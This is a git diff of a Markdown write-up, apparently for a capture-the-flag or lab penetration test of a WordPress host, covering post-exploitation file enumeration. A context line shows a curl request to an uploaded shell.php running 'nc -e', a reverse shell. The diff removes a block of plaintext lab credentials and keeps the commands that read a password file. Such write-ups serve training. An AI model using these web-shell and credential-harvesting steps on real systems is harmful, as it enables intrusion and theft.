@@ -149,10 +149,7 @@ curl "http://gridloy.hv/wp-content/uploads/wpr-addons/forms/shell.php?cmd=nc -e 
 ---
 
 
-###  Sensitive File Discovery
-After gaining an initial shell on the target system, I performed basic post-exploitation enumeration to identify sensitive files and misconfigurations.
-
-### 7.1 Filesystem Enumeration
+### Filesystem Enumeration
 
 While navigating through the WordPress installation directory, I inspected the following path:
 
@@ -160,14 +157,7 @@ While navigating through the WordPress installation directory, I inspected the f
 cd /var/www/html/wordpress
 ls -la
 ```
-
 During this process, I noticed a suspicious file named **`my_passwords.txt`**, which appeared to contain sensitive information.
-
-📸 **Screenshot:** Listing files inside `/var/www/html/wordpress`
-
----
-
-### 7.2 Credential File Discovery
 
 To inspect the contents of the file, I used the `cat` command:
 
@@ -177,24 +167,7 @@ cat /var/www/html/wordpress/my_passwords.txt
 
 📸 **Screenshot:** Contents of `my_passwords.txt`
 
-The file contained multiple plaintext credentials, including WordPress, MySQL, email, and system-level passwords:
-
-```text
-EMAIL: beth@gridloy.hv
-PASSWORD: tears-cartoon
-
-WORDPRESS
-USERNAME: admin
-PASSWORD: b2tGAIvRDpJpNit6q2
-
-MYSQL
-USERNAME: root
-PASSWORD: LhfJ5DuAYN5nsSvB
-
-USERS
-USER: root
-PASSWORD: aceRyanDI
-```
+<img width="432" height="269" alt="cevap 5" src="https://github.com/user-attachments/assets/06eb69e2-3ee1-4c7f-be4a-05b71eedb264" />
 
 This confirms a critical security misconfiguration, as highly sensitive credentials were stored in plaintext within the web root directory.
 
